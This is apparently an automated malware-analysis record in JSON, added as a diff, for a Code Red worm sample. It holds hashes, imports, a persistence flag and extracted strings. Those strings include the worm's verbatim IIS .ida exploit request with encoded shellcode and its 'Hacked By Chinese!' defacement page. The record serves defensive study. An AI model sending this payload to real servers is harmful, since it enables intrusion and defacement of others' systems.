@@ -1,0 +1,116 @@
+{
+  "sample_id": "CodeRed.a.exe",
+  "extraction_timestamp": "2025-11-01T13:38:48.245185",
+  "signal_categories": [
+    "static_metadata",
+    "strings_language",
+    "code_stylometry",
+    "build_environment",
+    "runtime_behavior",
+    "network_infrastructure",
+    "operational_artifacts",
+    "external_correlation",
+    "crypto_monetization",
+    "automation_signals"
+  ],
+  "static_metadata": {
+    "file_size": 4039,
+    "mime_type": "application/octet-stream",
+    "yara_matches": [],
+    "packers": [],
+    "has_signature": false
+  },
+  "strings_language": {
+    "strings": [
+      "GET /default.ida?NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a  HTTP/1.0",
+      "Content-type: text/xml",
+      "HOST:www.worm.com",
+      " Accept: */*",
+      "Content-length: 3569 ",
+      ":KERN",
+      ":LMTHu",
+      "UWSVPj<",
+      "X^[_]",
+      "LoadLibraryA",
+      "GetSystemTime",
+      "CreateThread",
+      "CreateFileA",
+      "Sleep",
+      "GetSystemDefaultLangID",
+      "VirtualProtect",
+      "infocomm.dll",
+      "TcpSockSend",
+      "WS2_32.dll",
+      "socket",
+      "connect",
+      "closesocket",
+      "w3svc.dll",
+      "  HTTP/1.0",
+      "Content-type: text/xml",
+      "HOST:www.worm.com",
+      " Accept: */*",
+      "Content-length: 3569 ",
+      "c:\\notworm",
+      "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=english\"><title>HELLO!</title></head><bady><hr size=5><font color=\"red\"><p align=\"center\">Welcome to http://www.worm.com !<br><br>Hacked By Chinese!</font></hr></bady></html>                                                                                                                                                    "
+    ],
+    "languages_detected": [],
+    "comments_language": null,
+    "hardcoded_paths": [],
+    "emails": [],
+    "phone_numbers": [],
+    "ip_addresses": [],
+    "urls": [
+      "www.worm.com",
+      "www.worm.com",
+      "http://www.worm.com"
+    ],
+    "locale_markers": {
+      "date_format_hints": [],
+      "currency_symbols": [],
+      "decimal_separators": []
+    }
+  },
+  "runtime_behavior": {
+    "persistence_methods": [
+      "registry_run_key"
+    ],
+    "syscalls": [],
+    "sandbox_checks": [],
+    "privilege_escalation_attempts": []
+  },
+  "network_infrastructure": {
+    "domains": [],
+    "ip_addresses": [],
+    "tls_ja3": null,
+    "asn": null,
+    "beacon_interval_sec": null
+  },
+  "operational_artifacts": {
+    "time_profile": {},
+    "weekday_activity": [],
+    "debug_artifacts": [],
+    "test_indicators": []
+  },
+  "external_correlation": {
+    "fuzzy_hash": null,
+    "vt_urls": [
+      "https://www.virustotal.com/gui/file/59fe169797953f2046b283235fe80158ebf02ba586eabfea306402fba8473dae"
+    ],
+    "whois": {},
+    "passive_dns": [],
+    "md5": "6f5767ec5a9cc6f7d195dde3c3939120",
+    "sha256": "59fe169797953f2046b283235fe80158ebf02ba586eabfea306402fba8473dae"
+  },
+  "crypto_monetization": {
+    "cryptocurrency_addresses": [],
+    "algorithms": [],
+    "static_keys": false,
+    "iv_reuse": false
+  },
+  "automation_signals": {
+    "repetitive_code": false,
+    "template_based": false,
+    "unniform_naming": false,
+    "likely_automated": false
+  }
+}
